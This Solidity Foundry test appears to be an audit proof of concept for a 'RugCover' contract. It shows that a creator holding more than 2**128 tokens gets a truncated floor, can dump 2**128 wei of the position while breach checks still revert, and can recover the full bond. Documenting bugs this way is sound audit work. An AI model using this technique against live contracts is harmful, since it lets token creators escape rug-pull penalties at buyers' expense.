// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {MakerRegistry} from "../src/MakerRegistry.sol";
import {FeeDistributor} from "../src/FeeDistributor.sol";
import {StoaRouter, ISignatureTransfer} from "../src/StoaRouter.sol";
import {RugCover} from "../src/RugCover.sol";
import {MockToken, MockAdapter, MockWHYPE, MockPermit2} from "./mocks/Mocks.sol";
import {IMakerRegistry, IFeeDistributor} from "../src/interfaces/IStoa.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract HugePonsFactory {
    struct Launched { address token; address curve; address creator; address feeTo; uint256 extra; }
    mapping(address => Launched) internal _l;
    function set(address token, address cr) external {
        _l[token] = Launched(token, address(0xC0FFEE), cr, cr, 1);
    }
    function getLaunchedToken(address token) external view returns (Launched memory) { return _l[token]; }
}

contract FloorTruncPoC is Test {
    RugCover rc;
    StoaRouter router;
    MockToken stoa;
    MockToken tok;
    MockAdapter uni;
    HugePonsFactory factory;
    MockWHYPE weth;

    address gov = makeAddr("gov");
    address guardian = makeAddr("guardian");
    address keeper = makeAddr("keeper");
    address creator = makeAddr("creator");
    address buyer = makeAddr("buyer");

    uint256 constant M = 1e18;

    function _params() internal pure returns (RugCover.Params memory p) {
        p.term = 3 days;
        p.feeBps = 100;
        p.capacityBps = 5000;
        p.premiumBps = 100;
        p.walletCapBps = 10000;
        p.bountyBps = 100;
        p.burnBps = 1000;
        p.minFloorBps = 1;
        p.minBond = 1 ether;
        p.maxBond = 10 ether;
        p.minCover = 0.1 ether;
        p.maxCover = 2 ether;
        p.maxTotalBonds = 100 ether;
        p.minFee = 0;
    }

    function setUp() public {
        vm.warp(1_795_000_000);
        weth = new MockWHYPE();
        stoa = new MockToken("STOA", 18);
        tok = new MockToken("HUGE", 18);
        MakerRegistry reg = new MakerRegistry(gov, gov, 3 days);
        FeeDistributor fees = new FeeDistributor(gov, IMakerRegistry(address(reg)));
        router = new StoaRouter(
            gov, IFeeDistributor(address(fees)), address(weth),
            ISignatureTransfer(address(new MockPermit2())), 1 days
        );
        uni = new MockAdapter(1000, 1);
        vm.startPrank(gov);
        router.addAdapter(address(uni));
        fees.setNotifier(address(router), true);
        vm.stopPrank();

        factory = new HugePonsFactory();
        factory.set(address(tok), creator);

        // creator holds MORE THAN 2**128 wei of tok
        uint256 huge = uint256(type(uint128).max) + 10 * M;
        tok.mint(creator, huge);
        tok.mint(address(uni), 5 * M);
        stoa.mint(buyer, 100 * M);
        stoa.mint(address(uni), 1_000 * M);

        rc = new RugCover(gov, router, IERC20(address(stoa)), address(factory),
                          guardian, keeper, _params());
        vm.deal(creator, 100 ether);
        vm.deal(buyer, 100 ether);
    }

    function test_floor_truncates_creator_escapes_breach() public {
        uint256 bal0 = tok.balanceOf(creator);
        assertGt(bal0, type(uint128).max, "pre: creator balance exceeds uint128");

        uint256 bond = 5 ether;
        uint256 fee = rc.feeFor(bond);

        vm.prank(creator);
        uint256 id = rc.open{value: bond + fee}(address(tok), bond);

        (uint256 lid, RugCover.Term memory t) = rc.latestTerm(address(tok));
        require(lid == id, "term id mismatch");
        uint256 storedFloor = t.floor;
        uint256 endsAt = t.endsAt;

        emit log_named_uint("creator real balance at open", bal0);
        emit log_named_uint("floor stored on chain", storedFloor);
        assertLt(storedFloor, 100 * M, "floor truncated to a trivially small value");
        assertEq(storedFloor, bal0 - 2 ** 128, "floor == low 128 bits of the real balance");

        // creator dumps everything down to the truncated floor (keeps storedFloor wei).
        // The floor check only reads balanceOf(creator), so a plain transfer is enough to
        // shed the position — no venue liquidity needed.
        address burner = makeAddr("burner");
        uint256 keep = storedFloor;                 // exactly the truncated floor
        uint256 dump = bal0 - keep;                 // = 2**128 wei of real tokens shed
        vm.prank(creator);
        tok.transfer(burner, dump);

        uint256 balAfter = tok.balanceOf(creator);
        emit log_named_uint("creator balance after shedding", balAfter);
        emit log_named_uint("tokens shed", dump);

        assertEq(balAfter, keep, "creator kept exactly the truncated floor");
        assertEq(dump, 2 ** 128, "creator shed a full 2**128 wei");
        assertTrue(balAfter < bal0, "creator really shed the bulk of the position");
        assertTrue(balAfter >= storedFloor, "truncated floor still 'holds' after shedding 2**128");

        // breach reverts: contract believes the floor is intact
        vm.expectRevert(RugCover.NotBreached.selector);
        rc.breach(address(tok));

        // after term + grace the creator releases the full bond
        vm.warp(endsAt + rc.GRACE() + 1);
        vm.prank(creator);
        uint256 returned = rc.release(address(tok), creator);
        assertEq(returned, bond, "creator recovered the entire bond after dumping everything");
        emit log_named_uint("bond returned to creator", returned);
    }
}
